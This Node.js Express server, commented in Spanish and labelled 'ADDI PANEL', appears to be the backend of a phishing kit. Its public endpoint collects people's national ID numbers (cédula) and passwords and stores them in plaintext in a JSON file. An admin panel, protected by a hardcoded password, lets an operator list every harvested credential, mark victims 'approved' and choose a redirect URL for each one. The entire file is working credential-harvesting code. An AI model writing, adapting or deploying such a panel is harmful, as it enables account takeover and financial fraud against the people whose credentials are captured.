// ══════════════════════════════════════════════════════════════
//  ADDI PANEL — Servidor Backend
//  Ejecutar: node server.js
//  Puerto:   3000  → http://localhost:3000
// ══════════════════════════════════════════════════════════════

const express = require("express");
const cors    = require("cors");
const fs      = require("fs");
const path    = require("path");
const crypto  = require("crypto");

const app  = express();
const PORT = 3000;
const DB   = path.join(__dirname, "db.json");

// ── Credenciales de administrador ──────────────────────────────
//    Cámbialas aquí cuando quieras.
const ADMIN_USER = "admin";
const ADMIN_PASS = "addi2026";

// ── Sesiones admin en memoria (token → expiry) ─────────────────
const sessions = {};

// ══ Middleware ══════════════════════════════════════════════════
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));   // sirve index.html, CSS, etc.

// ══ Helpers de base de datos ════════════════════════════════════
function readDB() {
  try {
    const raw = fs.readFileSync(DB, "utf8");
    return JSON.parse(raw);
  } catch {
    return { solicitudes: [] };
  }
}

function writeDB(data) {
  fs.writeFileSync(DB, JSON.stringify(data, null, 2), "utf8");
}

// ══ Middleware de autenticación admin ═══════════════════════════
function requireAdmin(req, res, next) {
  const token = req.headers["x-admin-token"];
  if (!token || !sessions[token]) {
    return res.status(401).json({ error: "No autorizado" });
  }
  if (sessions[token].expiry < Date.now()) {
    delete sessions[token];
    return res.status(401).json({ error: "Sesión expirada" });
  }
  sessions[token].expiry = Date.now() + 2 * 60 * 60 * 1000; // renueva 2h
  next();
}

// ══════════════════════════════════════════════════════════════
//  RUTAS PÚBLICAS (usuarios)
// ══════════════════════════════════════════════════════════════

// POST /api/solicitar  — usuario envía cédula + contraseña
app.post("/api/solicitar", (req, res) => {
  const { cedula, password } = req.body;

  if (!cedula || !password) {
    return res.status(400).json({ error: "Cédula y contraseña son requeridas." });
  }

  const db  = readDB();
  const idx = db.solicitudes.findIndex(s => s.cedula === String(cedula));

  if (idx !== -1) {
    // Si ya existía, actualiza contraseña, vuelve a poner en pendiente (para nueva evaluación) y timestamp
    db.solicitudes[idx].password    = String(password);
    db.solicitudes[idx].status      = "pending";
    db.solicitudes[idx].redirectUrl = "";
    db.solicitudes[idx].approvedAt  = null;
    db.solicitudes[idx].rejectedAt  = null;
    db.solicitudes[idx].updatedAt   = new Date().toISOString();
    writeDB(db);

    return res.json({
      status:      "pending",
      redirectUrl: ""
    });
  }

  // Nueva solicitud
  const nueva = {
    id:          Date.now(),
    cedula:      String(cedula),
    password:    String(password),
    createdAt:   new Date().toISOString(),
    updatedAt:   new Date().toISOString(),
    status:      "pending",
    redirectUrl: ""
  };
  db.solicitudes.push(nueva);
  writeDB(db);

  res.json({ status: "pending", redirectUrl: "" });
});

// GET /api/estado/:cedula  — consulta estado por cédula
app.get("/api/estado/:cedula", (req, res) => {
  const db   = readDB();
  const item = db.solicitudes.find(s => s.cedula === req.params.cedula);
  if (!item) return res.json({ status: "not_found" });
  res.json({
    status:      item.status,
    redirectUrl: item.status === "approved" ? (item.redirectUrl || "") : ""
  });
});

// ══════════════════════════════════════════════════════════════
//  RUTAS DE ADMIN
// ══════════════════════════════════════════════════════════════

// POST /api/admin/login
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = crypto.randomBytes(32).toString("hex");
    sessions[token] = { expiry: Date.now() + 2 * 60 * 60 * 1000 };
    return res.json({ token });
  }
  res.status(401).json({ error: "Usuario o contraseña incorrectos." });
});

// POST /api/admin/logout
app.post("/api/admin/logout", requireAdmin, (req, res) => {
  delete sessions[req.headers["x-admin-token"]];
  res.json({ ok: true });
});

// GET /api/admin/solicitudes  — lista completa
app.get("/api/admin/solicitudes", requireAdmin, (req, res) => {
  const db = readDB();
  // Más recientes primero
  const sorted = db.solicitudes.slice().sort((a, b) => b.id - a.id);
  res.json(sorted);
});

// PATCH /api/admin/solicitudes/:id/aprobar
app.patch("/api/admin/solicitudes/:id/aprobar", requireAdmin, (req, res) => {
  const { redirectUrl } = req.body;
  const db  = readDB();
  const idx = db.solicitudes.findIndex(s => s.id === Number(req.params.id));
  if (idx === -1) return res.status(404).json({ error: "No encontrado" });

  db.solicitudes[idx].status      = "approved";
  db.solicitudes[idx].redirectUrl = redirectUrl || "";
  db.solicitudes[idx].approvedAt  = new Date().toISOString();
  writeDB(db);

  res.json(db.solicitudes[idx]);
});

// PATCH /api/admin/solicitudes/:id/rechazar
app.patch("/api/admin/solicitudes/:id/rechazar", requireAdmin, (req, res) => {
  const db  = readDB();
  const idx = db.solicitudes.findIndex(s => s.id === Number(req.params.id));
  if (idx === -1) return res.status(404).json({ error: "No encontrado" });

  db.solicitudes[idx].status      = "rejected";
  db.solicitudes[idx].redirectUrl = "";
  db.solicitudes[idx].rejectedAt  = new Date().toISOString();
  writeDB(db);

  res.json(db.solicitudes[idx]);
});

// PATCH /api/admin/solicitudes/:id/revocar
app.patch("/api/admin/solicitudes/:id/revocar", requireAdmin, (req, res) => {
  const db  = readDB();
  const idx = db.solicitudes.findIndex(s => s.id === Number(req.params.id));
  if (idx === -1) return res.status(404).json({ error: "No encontrado" });

  db.solicitudes[idx].status      = "pending";
  db.solicitudes[idx].redirectUrl = "";
  db.solicitudes[idx].approvedAt  = null;
  db.solicitudes[idx].rejectedAt  = null;
  writeDB(db);

  res.json(db.solicitudes[idx]);
});

// DELETE /api/admin/solicitudes/:id
app.delete("/api/admin/solicitudes/:id", requireAdmin, (req, res) => {
  const db  = readDB();
  const len = db.solicitudes.length;
  db.solicitudes = db.solicitudes.filter(s => s.id !== Number(req.params.id));
  if (db.solicitudes.length === len) return res.status(404).json({ error: "No encontrado" });
  writeDB(db);
  res.json({ ok: true });
});

// ══ Iniciar servidor ══════════════════════════════════════════
app.listen(PORT, () => {
  console.log("╔══════════════════════════════════════════╗");
  console.log("║   Addi Panel — Servidor activo           ║");
  console.log(`║   http://localhost:${PORT}                   ║`);
  console.log("║   Para abrir: http://localhost:3000      ║");
  console.log("╚══════════════════════════════════════════╝");
});
